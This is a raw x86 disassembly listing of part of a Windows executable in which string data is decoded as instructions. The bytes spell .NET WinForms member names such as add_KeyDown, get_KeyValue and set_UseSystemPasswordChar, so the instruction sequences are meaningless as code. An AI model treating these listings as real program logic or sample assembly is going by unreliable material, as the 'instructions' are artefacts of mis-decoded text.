  40875e:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  408765:	5f                   	pop    %edi
  408766:	41                   	inc    %ecx
  408767:	75 74                	jne    0x4087dd
  408769:	6f                   	outsl  %ds:(%esi),(%dx)
  40876a:	53                   	push   %ebx
  40876b:	69 7a 65 00 43 6f 6e 	imul   $0x6e6f4300,0x65(%edx),%edi
  408772:	74 72                	je     0x4087e6
  408774:	6f                   	outsl  %ds:(%esi),(%dx)
  408775:	6c                   	insb   (%dx),%es:(%edi)
  408776:	43                   	inc    %ebx
  408777:	6f                   	outsl  %ds:(%esi),(%dx)
  408778:	6c                   	insb   (%dx),%es:(%edi)
  408779:	6c                   	insb   (%dx),%es:(%edi)
  40877a:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  40877f:	6e                   	outsb  %ds:(%esi),(%dx)
  408780:	00 67 65             	add    %ah,0x65(%edi)
  408783:	74 5f                	je     0x4087e4
  408785:	43                   	inc    %ebx
  408786:	6f                   	outsl  %ds:(%esi),(%dx)
  408787:	6e                   	outsb  %ds:(%esi),(%dx)
  408788:	74 72                	je     0x4087fc
  40878a:	6f                   	outsl  %ds:(%esi),(%dx)
  40878b:	6c                   	insb   (%dx),%es:(%edi)
  40878c:	73 00                	jae    0x40878e
  40878e:	41                   	inc    %ecx
  40878f:	64 64 00 73 65       	fs add %dh,%fs:0x65(%ebx)
  408794:	74 5f                	je     0x4087f5
  408796:	55                   	push   %ebp
  408797:	73 65                	jae    0x4087fe
  408799:	53                   	push   %ebx
  40879a:	79 73                	jns    0x40880f
  40879c:	74 65                	je     0x408803
  40879e:	6d                   	insl   (%dx),%es:(%edi)
  40879f:	50                   	push   %eax
  4087a0:	61                   	popa
  4087a1:	73 73                	jae    0x408816
  4087a3:	77 6f                	ja     0x408814
  4087a5:	72 64                	jb     0x40880b
  4087a7:	43                   	inc    %ebx
  4087a8:	68 61 72 00 53       	push   $0x53007261
  4087ad:	65 74 42             	gs je  0x4087f2
  4087b0:	6f                   	outsl  %ds:(%esi),(%dx)
  4087b1:	75 6e                	jne    0x408821
  4087b3:	64 73 00             	fs jae 0x4087b6
  4087b6:	50                   	push   %eax
  4087b7:	74 72                	je     0x40882b
  4087b9:	54                   	push   %esp
  4087ba:	6f                   	outsl  %ds:(%esi),(%dx)
  4087bb:	53                   	push   %ebx
  4087bc:	74 72                	je     0x408830
  4087be:	69 6e 67 55 6e 69 00 	imul   $0x696e55,0x67(%esi),%ebp
  4087c5:	73 65                	jae    0x40882c
  4087c7:	74 5f                	je     0x408828
  4087c9:	44                   	inc    %esp
  4087ca:	69 61 6c 6f 67 52 65 	imul   $0x6552676f,0x6c(%ecx),%esp
  4087d1:	73 75                	jae    0x408848
  4087d3:	6c                   	insb   (%dx),%es:(%edi)
  4087d4:	74 00                	je     0x4087d6
  4087d6:	4d                   	dec    %ebp
  4087d7:	61                   	popa
  4087d8:	74 68                	je     0x408842
  4087da:	00 4d 61             	add    %cl,0x61(%ebp)
  4087dd:	78 00                	js     0x4087df
  4087df:	73 65                	jae    0x408846
  4087e1:	74 5f                	je     0x408842
  4087e3:	43                   	inc    %ebx
  4087e4:	6c                   	insb   (%dx),%es:(%edi)
  4087e5:	69 65 6e 74 53 69 7a 	imul   $0x7a695374,0x6e(%ebp),%esp
  4087ec:	65 00 41 64          	add    %al,%gs:0x64(%ecx)
  4087f0:	64 52                	fs push %edx
  4087f2:	61                   	popa
  4087f3:	6e                   	outsb  %ds:(%esi),(%dx)
  4087f4:	67 65 00 46 6f       	add    %al,%gs:0x6f(%bp)
  4087f9:	72 6d                	jb     0x408868
  4087fb:	42                   	inc    %edx
  4087fc:	6f                   	outsl  %ds:(%esi),(%dx)
  4087fd:	72 64                	jb     0x408863
  4087ff:	65 72 53             	gs jb  0x408855
  408802:	74 79                	je     0x40887d
  408804:	6c                   	insb   (%dx),%es:(%edi)
  408805:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  408809:	74 5f                	je     0x40886a
  40880b:	46                   	inc    %esi
  40880c:	6f                   	outsl  %ds:(%esi),(%dx)
  40880d:	72 6d                	jb     0x40887c
  40880f:	42                   	inc    %edx
  408810:	6f                   	outsl  %ds:(%esi),(%dx)
  408811:	72 64                	jb     0x408877
  408813:	65 72 53             	gs jb  0x408869
  408816:	74 79                	je     0x408891
  408818:	6c                   	insb   (%dx),%es:(%edi)
  408819:	65 00 46 6f          	add    %al,%gs:0x6f(%esi)
  40881d:	72 6d                	jb     0x40888c
  40881f:	53                   	push   %ebx
  408820:	74 61                	je     0x408883
  408822:	72 74                	jb     0x408898
  408824:	50                   	push   %eax
  408825:	6f                   	outsl  %ds:(%esi),(%dx)
  408826:	73 69                	jae    0x408891
  408828:	74 69                	je     0x408893
  40882a:	6f                   	outsl  %ds:(%esi),(%dx)
  40882b:	6e                   	outsb  %ds:(%esi),(%dx)
  40882c:	00 73 65             	add    %dh,0x65(%ebx)
  40882f:	74 5f                	je     0x408890
  408831:	53                   	push   %ebx
  408832:	74 61                	je     0x408895
  408834:	72 74                	jb     0x4088aa
  408836:	50                   	push   %eax
  408837:	6f                   	outsl  %ds:(%esi),(%dx)
  408838:	73 69                	jae    0x4088a3
  40883a:	74 69                	je     0x4088a5
  40883c:	6f                   	outsl  %ds:(%esi),(%dx)
  40883d:	6e                   	outsb  %ds:(%esi),(%dx)
  40883e:	00 41 73             	add    %al,0x73(%ecx)
  408841:	73 65                	jae    0x4088a8
  408843:	6d                   	insl   (%dx),%es:(%edi)
  408844:	62 6c 79 00          	bound  %ebp,0x0(%ecx,%edi,2)
  408848:	47                   	inc    %edi
  408849:	65 74 45             	gs je  0x408891
  40884c:	78 65                	js     0x4088b3
  40884e:	63 75 74             	arpl   %esi,0x74(%ebp)
  408851:	69 6e 67 41 73 73 65 	imul   $0x65737341,0x67(%esi),%ebp
  408858:	6d                   	insl   (%dx),%es:(%edi)
  408859:	62 6c 79 00          	bound  %ebp,0x0(%ecx,%edi,2)
  40885d:	67 65 74 5f          	addr16 gs je 0x4088c0
  408861:	4c                   	dec    %esp
  408862:	6f                   	outsl  %ds:(%esi),(%dx)
  408863:	63 61 74             	arpl   %esp,0x74(%ecx)
  408866:	69 6f 6e 00 49 63 6f 	imul   $0x6f634900,0x6e(%edi),%ebp
  40886d:	6e                   	outsb  %ds:(%esi),(%dx)
  40886e:	00 45 78             	add    %al,0x78(%ebp)
  408871:	74 72                	je     0x4088e5
  408873:	61                   	popa
  408874:	63 74 41 73          	arpl   %esi,0x73(%ecx,%eax,2)
  408878:	73 6f                	jae    0x4088e9
  40887a:	63 69 61             	arpl   %ebp,0x61(%ecx)
  40887d:	74 65                	je     0x4088e4
  40887f:	64 49                	fs dec %ecx
  408881:	63 6f 6e             	arpl   %ebp,0x6e(%edi)
  408884:	00 73 65             	add    %dh,0x65(%ebx)
  408887:	74 5f                	je     0x4088e8
  408889:	49                   	dec    %ecx
  40888a:	63 6f 6e             	arpl   %ebp,0x6e(%edi)
  40888d:	00 73 65             	add    %dh,0x65(%ebx)
  408890:	74 5f                	je     0x4088f1
  408892:	4d                   	dec    %ebp
  408893:	69 6e 69 6d 69 7a 65 	imul   $0x657a696d,0x69(%esi),%ebp
  40889a:	42                   	inc    %edx
  40889b:	6f                   	outsl  %ds:(%esi),(%dx)
  40889c:	78 00                	js     0x40889e
  40889e:	73 65                	jae    0x408905
  4088a0:	74 5f                	je     0x408901
  4088a2:	4d                   	dec    %ebp
  4088a3:	61                   	popa
  4088a4:	78 69                	js     0x40890f
  4088a6:	6d                   	insl   (%dx),%es:(%edi)
  4088a7:	69 7a 65 42 6f 78 00 	imul   $0x786f42,0x65(%edx),%edi
  4088ae:	49                   	dec    %ecx
  4088af:	42                   	inc    %edx
  4088b0:	75 74                	jne    0x408926
  4088b2:	74 6f                	je     0x408923
  4088b4:	6e                   	outsb  %ds:(%esi),(%dx)
  4088b5:	43                   	inc    %ebx
  4088b6:	6f                   	outsl  %ds:(%esi),(%dx)
  4088b7:	6e                   	outsb  %ds:(%esi),(%dx)
  4088b8:	74 72                	je     0x40892c
  4088ba:	6f                   	outsl  %ds:(%esi),(%dx)
  4088bb:	6c                   	insb   (%dx),%es:(%edi)
  4088bc:	00 73 65             	add    %dh,0x65(%ebx)
  4088bf:	74 5f                	je     0x408920
  4088c1:	41                   	inc    %ecx
  4088c2:	63 63 65             	arpl   %esp,0x65(%ebx)
  4088c5:	70 74                	jo     0x40893b
  4088c7:	42                   	inc    %edx
  4088c8:	75 74                	jne    0x40893e
  4088ca:	74 6f                	je     0x40893b
  4088cc:	6e                   	outsb  %ds:(%esi),(%dx)
  4088cd:	00 73 65             	add    %dh,0x65(%ebx)
  4088d0:	74 5f                	je     0x408931
  4088d2:	43                   	inc    %ebx
  4088d3:	61                   	popa
  4088d4:	6e                   	outsb  %ds:(%esi),(%dx)
  4088d5:	63 65 6c             	arpl   %esp,0x6c(%ebp)
  4088d8:	42                   	inc    %edx
  4088d9:	75 74                	jne    0x40894f
  4088db:	74 6f                	je     0x40894c
  4088dd:	6e                   	outsb  %ds:(%esi),(%dx)
  4088de:	00 53 68             	add    %dl,0x68(%ebx)
  4088e1:	6f                   	outsl  %ds:(%esi),(%dx)
  4088e2:	77 44                	ja     0x408928
  4088e4:	69 61 6c 6f 67 00 67 	imul   $0x6700676f,0x6c(%ecx),%esp
  4088eb:	65 74 5f             	gs je  0x40894d
  4088ee:	54                   	push   %esp
  4088ef:	65 78 74             	gs js  0x408966
  4088f2:	00 67 65             	add    %ah,0x65(%edi)
  4088f5:	74 5f                	je     0x408956
  4088f7:	43                   	inc    %ebx
  4088f8:	6f                   	outsl  %ds:(%esi),(%dx)
  4088f9:	75 6e                	jne    0x408969
  4088fb:	74 00                	je     0x4088fd
  4088fd:	52                   	push   %edx
  4088fe:	61                   	popa
  4088ff:	64 69 6f 42 75 74 74 	imul   $0x6f747475,%fs:0x42(%edi),%ebp
  408906:	6f 
  408907:	6e                   	outsb  %ds:(%esi),(%dx)
  408908:	00 54 6f 6f          	add    %dl,0x6f(%edi,%ebp,2)
  40890c:	6c                   	insb   (%dx),%es:(%edi)
  40890d:	54                   	push   %esp
  40890e:	69 70 00 49 45 6e 75 	imul   $0x756e4549,0x0(%eax),%esi
  408915:	6d                   	insl   (%dx),%es:(%edi)
  408916:	65 72 61             	gs jb  0x40897a
  408919:	74 6f                	je     0x40898a
  40891b:	72 60                	jb     0x40897d
  40891d:	31 00                	xor    %eax,(%eax)
  40891f:	47                   	inc    %edi
  408920:	65 74 45             	gs je  0x408968
  408923:	6e                   	outsb  %ds:(%esi),(%dx)
  408924:	75 6d                	jne    0x408993
  408926:	65 72 61             	gs jb  0x40898a
  408929:	74 6f                	je     0x40899a
  40892b:	72 00                	jb     0x40892d
  40892d:	67 65 74 5f          	addr16 gs je 0x408990
  408931:	43                   	inc    %ebx
  408932:	75 72                	jne    0x4089a6
  408934:	72 65                	jb     0x40899b
  408936:	6e                   	outsb  %ds:(%esi),(%dx)
  408937:	74 00                	je     0x408939
  408939:	67 65 74 5f          	addr16 gs je 0x40899c
  40893d:	4c                   	dec    %esp
  40893e:	61                   	popa
  40893f:	62 65 6c             	bound  %esp,0x6c(%ebp)
  408942:	00 73 65             	add    %dh,0x65(%ebx)
  408945:	74 5f                	je     0x4089a6
  408947:	43                   	inc    %ebx
  408948:	68 65 63 6b 65       	push   $0x656b6365
  40894d:	64 00 67 65          	add    %ah,%fs:0x65(%edi)
  408951:	74 5f                	je     0x4089b2
  408953:	48                   	dec    %eax
  408954:	65 69 67 68 74 00 67 	imul   $0x65670074,%gs:0x68(%edi),%esp
  40895b:	65 
  40895c:	74 5f                	je     0x4089bd
  40895e:	48                   	dec    %eax
  40895f:	65 6c                	gs insb (%dx),%es:(%edi)
  408961:	70 4d                	jo     0x4089b0
  408963:	65 73 73             	gs jae 0x4089d9
  408966:	61                   	popa
  408967:	67 65 00 53 65       	add    %dl,%gs:0x65(%bp,%di)
  40896c:	74 54                	je     0x4089c2
  40896e:	6f                   	outsl  %ds:(%esi),(%dx)
  40896f:	6f                   	outsl  %ds:(%esi),(%dx)
  408970:	6c                   	insb   (%dx),%es:(%edi)
  408971:	54                   	push   %esp
  408972:	69 70 00 53 79 73 74 	imul   $0x74737953,0x0(%eax),%esi
  408979:	65 6d                	gs insl (%dx),%es:(%edi)
  40897b:	2e 43                	cs inc %ebx
  40897d:	6f                   	outsl  %ds:(%esi),(%dx)
  40897e:	6c                   	insb   (%dx),%es:(%edi)
  40897f:	6c                   	insb   (%dx),%es:(%edi)
  408980:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  408985:	6e                   	outsb  %ds:(%esi),(%dx)
  408986:	73 00                	jae    0x408988
  408988:	49                   	dec    %ecx
  408989:	45                   	inc    %ebp
  40898a:	6e                   	outsb  %ds:(%esi),(%dx)
  40898b:	75 6d                	jne    0x4089fa
  40898d:	65 72 61             	gs jb  0x4089f1
  408990:	74 6f                	je     0x408a01
  408992:	72 00                	jb     0x408994
  408994:	4d                   	dec    %ebp
  408995:	6f                   	outsl  %ds:(%esi),(%dx)
  408996:	76 65                	jbe    0x4089fd
  408998:	4e                   	dec    %esi
  408999:	65 78 74             	gs js  0x408a10
  40899c:	00 49 44             	add    %cl,0x44(%ecx)
  40899f:	69 73 70 6f 73 61 62 	imul   $0x6261736f,0x70(%ebx),%esi
  4089a6:	6c                   	insb   (%dx),%es:(%edi)
  4089a7:	65 00 44 69 73       	add    %al,%gs:0x73(%ecx,%ebp,2)
  4089ac:	70 6f                	jo     0x408a1d
  4089ae:	73 65                	jae    0x408a15
  4089b0:	00 73 65             	add    %dh,0x65(%ebx)
  4089b3:	74 5f                	je     0x408a14
  4089b5:	53                   	push   %ebx
  4089b6:	68 6f 77 41 6c       	push   $0x6c41776f
  4089bb:	77 61                	ja     0x408a1e
  4089bd:	79 73                	jns    0x408a32
  4089bf:	00 67 65             	add    %ah,0x65(%edi)
  4089c2:	74 5f                	je     0x408a23
  4089c4:	43                   	inc    %ebx
  4089c5:	68 65 63 6b 65       	push   $0x656b6365
  4089ca:	64 00 42 79          	add    %al,%fs:0x79(%edx)
  4089ce:	74 65                	je     0x408a35
  4089d0:	00 4b 65             	add    %cl,0x65(%ebx)
  4089d3:	79 45                	jns    0x408a1a
  4089d5:	76 65                	jbe    0x408a3c
  4089d7:	6e                   	outsb  %ds:(%esi),(%dx)
  4089d8:	74 48                	je     0x408a22
  4089da:	61                   	popa
  4089db:	6e                   	outsb  %ds:(%esi),(%dx)
  4089dc:	64 6c                	fs insb (%dx),%es:(%edi)
  4089de:	65 72 00             	gs jb  0x4089e1
  4089e1:	61                   	popa
  4089e2:	64 64 5f             	fs fs pop %edi
  4089e5:	4b                   	dec    %ebx
  4089e6:	65 79 44             	gs jns 0x408a2d
  4089e9:	6f                   	outsl  %ds:(%esi),(%dx)
  4089ea:	77 6e                	ja     0x408a5a
  4089ec:	00 61 64             	add    %ah,0x64(%ecx)
  4089ef:	64 5f                	fs pop %edi
  4089f1:	4b                   	dec    %ebx
  4089f2:	65 79 55             	gs jns 0x408a4a
  4089f5:	70 00                	jo     0x4089f7
  4089f7:	67 65 74 5f          	addr16 gs je 0x408a5a
  4089fb:	4b                   	dec    %ebx
  4089fc:	65 79 56             	gs jns 0x408a55
  4089ff:	61                   	popa
  408a00:	6c                   	insb   (%dx),%es:(%edi)
  408a01:	75 65                	jne    0x408a68
  408a03:	00 73 65             	add    %dh,0x65(%ebx)
  408a06:	74 5f                	je     0x408a67
  408a08:	56                   	push   %esi
  408a09:	69 72 74 75 61 6c 4b 	imul   $0x4b6c6175,0x74(%edx),%esi
  408a10:	65 79 43             	gs jns 0x408a56
  408a13:	6f                   	outsl  %ds:(%esi),(%dx)
  408a14:	64 65 00 67 65       	fs add %ah,%gs:0x65(%edi)
  408a19:	74 5f                	je     0x408a7a
  408a1b:	4b                   	dec    %ebx
  408a1c:	65 79 43             	gs jns 0x408a62
  408a1f:	6f                   	outsl  %ds:(%esi),(%dx)
  408a20:	64 65 00 67 65       	fs add %ah,%gs:0x65(%edi)
  408a25:	74 5f                	je     0x408a86
  408a27:	53                   	push   %ebx
  408a28:	68 69 66 74 00       	push   $0x746669
  408a2d:	67 65 74 5f          	addr16 gs je 0x408a90
  408a31:	41                   	inc    %ecx
  408a32:	6c                   	insb   (%dx),%es:(%edi)
  408a33:	74 00                	je     0x408a35
  408a35:	67 65 74 5f          	addr16 gs je 0x408a98
  408a39:	43                   	inc    %ebx
  408a3a:	6f                   	outsl  %ds:(%esi),(%dx)
  408a3b:	6e                   	outsb  %ds:(%esi),(%dx)
  408a3c:	74 72                	je     0x408ab0
  408a3e:	6f                   	outsl  %ds:(%esi),(%dx)
  408a3f:	6c                   	insb   (%dx),%es:(%edi)
  408a40:	00 67 65             	add    %ah,0x65(%edi)
  408a43:	74 5f                	je     0x408aa4
  408a45:	43                   	inc    %ebx
  408a46:	68 61 72 73 00       	push   $0x737261
  408a4b:	73 65                	jae    0x408ab2
  408a4d:	74 5f                	je     0x408aae
  408a4f:	43                   	inc    %ebx
  408a50:	68 61 72 61 63       	push   $0x63617261
  408a55:	74 65                	je     0x408abc
  408a57:	72 00                	jb     0x408a59
  408a59:	73 65                	jae    0x408ac0
  408a5b:	74 5f                	je     0x408abc
  408a5d:	4b                   	dec    %ebx
  408a5e:	65 79 44             	gs jns 0x408aa5
  408a61:	6f                   	outsl  %ds:(%esi),(%dx)
  408a62:	77 6e                	ja     0x408ad2
  408a64:	00 43 6f             	add    %al,0x6f(%ebx)
  408a67:	6e                   	outsb  %ds:(%esi),(%dx)
  408a68:	74 72                	je     0x408adc
  408a6a:	6f                   	outsl  %ds:(%esi),(%dx)
  408a6b:	6c                   	insb   (%dx),%es:(%edi)
  408a6c:	4b                   	dec    %ebx
  408a6d:	65 79 53             	gs jns 0x408ac3
  408a70:	74 61                	je     0x408ad3
  408a72:	74 65                	je     0x408ad9
  408a74:	73 00                	jae    0x408a76
  408a76:	73 65                	jae    0x408add
  408a78:	74 5f                	je     0x408ad9
  408a7a:	43                   	inc    %ebx
  408a7b:	6f                   	outsl  %ds:(%esi),(%dx)
  408a7c:	6e                   	outsb  %ds:(%esi),(%dx)
  408a7d:	74 72                	je     0x408af1
  408a7f:	6f                   	outsl  %ds:(%esi),(%dx)
  408a80:	6c                   	insb   (%dx),%es:(%edi)
  408a81:	4b                   	dec    %ebx
  408a82:	65 79 53             	gs jns 0x408ad8
  408a85:	74 61                	je     0x408ae8
  408a87:	74 65                	je     0x408aee
  408a89:	00 67 65             	add    %ah,0x65(%edi)
  408a8c:	74 5f                	je     0x408aed
  408a8e:	43                   	inc    %ebx
  408a8f:	6f                   	outsl  %ds:(%esi),(%dx)
  408a90:	6e                   	outsb  %ds:(%esi),(%dx)
  408a91:	74 72                	je     0x408b05
  408a93:	6f                   	outsl  %ds:(%esi),(%dx)
  408a94:	6c                   	insb   (%dx),%es:(%edi)
  408a95:	4b                   	dec    %ebx
  408a96:	65 79 53             	gs jns 0x408aec
  408a99:	74 61                	je     0x408afc
  408a9b:	74 65                	je     0x408b02
  408a9d:	00 67 65             	add    %ah,0x65(%edi)
  408aa0:	74 5f                	je     0x408b01
  408aa2:	4d                   	dec    %ebp
  408aa3:	6f                   	outsl  %ds:(%esi),(%dx)
  408aa4:	64 69 66 69 65 72 73 	imul   $0x737265,%fs:0x69(%esi),%esp
  408aab:	00 
  408aac:	67 65 74 5f          	addr16 gs je 0x408b0f
  408ab0:	42                   	inc    %edx
  408ab1:	6c                   	insb   (%dx),%es:(%edi)
  408ab2:	61                   	popa
  408ab3:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  408ab6:	67 65 74 5f          	addr16 gs je 0x408b19
  408aba:	42                   	inc    %edx
  408abb:	6c                   	insb   (%dx),%es:(%edi)
  408abc:	75 65                	jne    0x408b23
  408abe:	00 67 65             	add    %ah,0x65(%edi)
  408ac1:	74 5f                	je     0x408b22
  408ac3:	43                   	inc    %ebx
  408ac4:	79 61                	jns    0x408b27
  408ac6:	6e                   	outsb  %ds:(%esi),(%dx)
  408ac7:	00 43 6f             	add    %al,0x6f(%ebx)
  408aca:	6c                   	insb   (%dx),%es:(%edi)
  408acb:	6f                   	outsl  %ds:(%esi),(%dx)
  408acc:	72 54                	jb     0x408b22
  408ace:	72 61                	jb     0x408b31
  408ad0:	6e                   	outsb  %ds:(%esi),(%dx)
  408ad1:	73 6c                	jae    0x408b3f
  408ad3:	61                   	popa
  408ad4:	74 6f                	je     0x408b45
  408ad6:	72 00                	jb     0x408ad8
  408ad8:	46                   	inc    %esi
  408ad9:	72 6f                	jb     0x408b4a
  408adb:	6d                   	insl   (%dx),%es:(%edi)
  408adc:	48                   	dec    %eax
  408add:	74 6d                	je     0x408b4c
  408adf:	6c                   	insb   (%dx),%es:(%edi)
  408ae0:	00 67 65             	add    %ah,0x65(%edi)
  408ae3:	74 5f                	je     0x408b44
  408ae5:	4d                   	dec    %ebp
  408ae6:	61                   	popa
  408ae7:	67 65 6e             	outsb  %gs:(%si),(%dx)
  408aea:	74 61                	je     0x408b4d
  408aec:	00 67 65             	add    %ah,0x65(%edi)
  408aef:	74 5f                	je     0x408b50
  408af1:	52                   	push   %edx
  408af2:	65 64 00 67 65       	gs add %ah,%fs:0x65(%edi)
  408af7:	74 5f                	je     0x408b58
  408af9:	57                   	push   %edi
  408afa:	68 69 74 65 00       	push   $0x657469
  408aff:	67 65 74 5f          	addr16 gs je 0x408b62
  408b03:	59                   	pop    %ecx
  408b04:	65 6c                	gs insb (%dx),%es:(%edi)
  408b06:	6c                   	insb   (%dx),%es:(%edi)
  408b07:	6f                   	outsl  %ds:(%esi),(%dx)
  408b08:	77 00                	ja     0x408b0a
  408b0a:	53                   	push   %ebx
  408b0b:	75 73                	jne    0x408b80
  408b0d:	70 65                	jo     0x408b74
  408b0f:	6e                   	outsb  %ds:(%esi),(%dx)
  408b10:	64 4c                	fs dec %esp
  408b12:	61                   	popa
  408b13:	79 6f                	jns    0x408b84
  408b15:	75 74                	jne    0x408b8b
  408b17:	00 53 63             	add    %dl,0x63(%ebx)
  408b1a:	72 6f                	jb     0x408b8b
  408b1c:	6c                   	insb   (%dx),%es:(%edi)
  408b1d:	6c                   	insb   (%dx),%es:(%edi)
  408b1e:	61                   	popa
  408b1f:	62 6c 65 43          	bound  %ebp,0x43(%ebp,%eiz,2)
  408b23:	6f                   	outsl  %ds:(%esi),(%dx)
  408b24:	6e                   	outsb  %ds:(%esi),(%dx)
  408b25:	74 72                	je     0x408b99
  408b27:	6f                   	outsl  %ds:(%esi),(%dx)
  408b28:	6c                   	insb   (%dx),%es:(%edi)
  408b29:	00 73 65             	add    %dh,0x65(%ebx)
  408b2c:	74 5f                	je     0x408b8d
  408b2e:	41                   	inc    %ecx
  408b2f:	75 74                	jne    0x408ba5
  408b31:	6f                   	outsl  %ds:(%esi),(%dx)
  408b32:	53                   	push   %ebx
  408b33:	63 72 6f             	arpl   %esi,0x6f(%edx)
  408b36:	6c                   	insb   (%dx),%es:(%edi)
  408b37:	6c                   	insb   (%dx),%es:(%edi)
  408b38:	00 73 65             	add    %dh,0x65(%ebx)
  408b3b:	74 5f                	je     0x408b9c
  408b3d:	42                   	inc    %edx
  408b3e:	61                   	popa
  408b3f:	63 6b 43             	arpl   %ebp,0x43(%ebx)
  408b42:	6f                   	outsl  %ds:(%esi),(%dx)
  408b43:	6c                   	insb   (%dx),%es:(%edi)
  408b44:	6f                   	outsl  %ds:(%esi),(%dx)
  408b45:	72 00                	jb     0x408b47
  408b47:	73 65                	jae    0x408bae
  408b49:	74 5f                	je     0x408baa
  408b4b:	43                   	inc    %ebx
  408b4c:	6f                   	outsl  %ds:(%esi),(%dx)
  408b4d:	6e                   	outsb  %ds:(%esi),(%dx)
  408b4e:	74 72                	je     0x408bc2
  408b50:	6f                   	outsl  %ds:(%esi),(%dx)
  408b51:	6c                   	insb   (%dx),%es:(%edi)
  408b52:	42                   	inc    %edx
  408b53:	6f                   	outsl  %ds:(%esi),(%dx)
  408b54:	78 00                	js     0x408b56
  408b56:	52                   	push   %edx
  408b57:	65 73 75             	gs jae 0x408bcf
  408b5a:	6d                   	insl   (%dx),%es:(%edi)
  408b5b:	65 4c                	gs dec %esp
  408b5d:	61                   	popa
  408b5e:	79 6f                	jns    0x408bcf
  408b60:	75 74                	jne    0x408bd6
  408b62:	00 45 6c             	add    %al,0x6c(%ebp)
  408b65:	61                   	popa
  408b66:	70 73                	jo     0x408bdb
  408b68:	65 64 45             	gs fs inc %ebp
  408b6b:	76 65                	jbe    0x408bd2
  408b6d:	6e                   	outsb  %ds:(%esi),(%dx)
  408b6e:	74 48                	je     0x408bb8
  408b70:	61                   	popa
  408b71:	6e                   	outsb  %ds:(%esi),(%dx)
  408b72:	64 6c                	fs insb (%dx),%es:(%edi)
  408b74:	65 72 00             	gs jb  0x408b77
  408b77:	61                   	popa
  408b78:	64 64 5f             	fs fs pop %edi
  408b7b:	45                   	inc    %ebp
  408b7c:	6c                   	insb   (%dx),%es:(%edi)
  408b7d:	61                   	popa
  408b7e:	70 73                	jo     0x408bf3
  408b80:	65 64 00 73 65       	gs add %dh,%fs:0x65(%ebx)
  408b85:	74 5f                	je     0x408be6
  408b87:	49                   	dec    %ecx
  408b88:	6e                   	outsb  %ds:(%esi),(%dx)
  408b89:	74 65                	je     0x408bf0
  408b8b:	72 76                	jb     0x408c03
  408b8d:	61                   	popa
  408b8e:	6c                   	insb   (%dx),%es:(%edi)
  408b8f:	00 73 65             	add    %dh,0x65(%ebx)
  408b92:	74 5f                	je     0x408bf3
  408b94:	41                   	inc    %ecx
  408b95:	75 74                	jne    0x408c0b
  408b97:	6f                   	outsl  %ds:(%esi),(%dx)
  408b98:	52                   	push   %edx
  408b99:	65 73 65             	gs jae 0x408c01
  408b9c:	74 00                	je     0x408b9e
  408b9e:	53                   	push   %ebx
  408b9f:	74 61                	je     0x408c02
  408ba1:	72 74                	jb     0x408c17
  408ba3:	00 67 65             	add    %ah,0x65(%edi)
  408ba6:	74 5f                	je     0x408c07
  408ba8:	49                   	dec    %ecx
  408ba9:	74 65                	je     0x408c10
  408bab:	6d                   	insl   (%dx),%es:(%edi)
  408bac:	00 73 65             	add    %dh,0x65(%ebx)
  408baf:	74 5f                	je     0x408c10
  408bb1:	56                   	push   %esi
  408bb2:	61                   	popa
  408bb3:	6c                   	insb   (%dx),%es:(%edi)
  408bb4:	75 65                	jne    0x408c1b
  408bb6:	00 52 65             	add    %dl,0x65(%edx)
  408bb9:	66 72 65             	data16 jb 0x408c21
  408bbc:	73 68                	jae    0x408c26
  408bbe:	00 73 65             	add    %dh,0x65(%ebx)
  408bc1:	74 5f                	je     0x408c22
  408bc3:	4c                   	dec    %esp
  408bc4:	65 66 74 00          	gs data16 je 0x408bc8
  408bc8:	73 65                	jae    0x408c2f
  408bca:	74 5f                	je     0x408c2b
  408bcc:	54                   	push   %esp
  408bcd:	6f                   	outsl  %ds:(%esi),(%dx)
  408bce:	70 00                	jo     0x408bd0
  408bd0:	46                   	inc    %esi
  408bd1:	6f                   	outsl  %ds:(%esi),(%dx)
  408bd2:	6e                   	outsb  %ds:(%esi),(%dx)
  408bd3:	74 00                	je     0x408bd5
  408bd5:	67 65 74 5f          	addr16 gs je 0x408c38
  408bd9:	46                   	inc    %esi
  408bda:	6f                   	outsl  %ds:(%esi),(%dx)
  408bdb:	6e                   	outsb  %ds:(%esi),(%dx)
  408bdc:	74 00                	je     0x408bde
  408bde:	46                   	inc    %esi
  408bdf:	6f                   	outsl  %ds:(%esi),(%dx)
  408be0:	6e                   	outsb  %ds:(%esi),(%dx)
  408be1:	74 53                	je     0x408c36
  408be3:	74 79                	je     0x408c5e
  408be5:	6c                   	insb   (%dx),%es:(%edi)
  408be6:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  408bea:	74 5f                	je     0x408c4b
  408bec:	46                   	inc    %esi
  408bed:	6f                   	outsl  %ds:(%esi),(%dx)
  408bee:	6e                   	outsb  %ds:(%esi),(%dx)
  408bef:	74 00                	je     0x408bf1
  408bf1:	50                   	push   %eax
  408bf2:	72 6f                	jb     0x408c63
  408bf4:	67 72 65             	addr16 jb 0x408c5c
  408bf7:	73 73                	jae    0x408c6c
  408bf9:	42                   	inc    %edx
  408bfa:	61                   	popa
  408bfb:	72 53                	jb     0x408c50
  408bfd:	74 79                	je     0x408c78
  408bff:	6c                   	insb   (%dx),%es:(%edi)
  408c00:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  408c04:	74 5f                	je     0x408c65
  408c06:	53                   	push   %ebx
  408c07:	74 79                	je     0x408c82
  408c09:	6c                   	insb   (%dx),%es:(%edi)
  408c0a:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  408c0e:	74 5f                	je     0x408c6f
  408c10:	46                   	inc    %esi
  408c11:	6f                   	outsl  %ds:(%esi),(%dx)
  408c12:	72 65                	jb     0x408c79
  408c14:	43                   	inc    %ebx
  408c15:	6f                   	outsl  %ds:(%esi),(%dx)
  408c16:	6c                   	insb   (%dx),%es:(%edi)
  408c17:	6f                   	outsl  %ds:(%esi),(%dx)
  408c18:	72 00                	jb     0x408c1a
  408c1a:	73 65                	jae    0x408c81
  408c1c:	74 5f                	je     0x408c7d
  408c1e:	53                   	push   %ebx
  408c1f:	69 7a 65 00 67 65 74 	imul   $0x74656700,0x65(%edx),%edi
  408c26:	5f                   	pop    %edi
  408c27:	41                   	inc    %ecx
  408c28:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
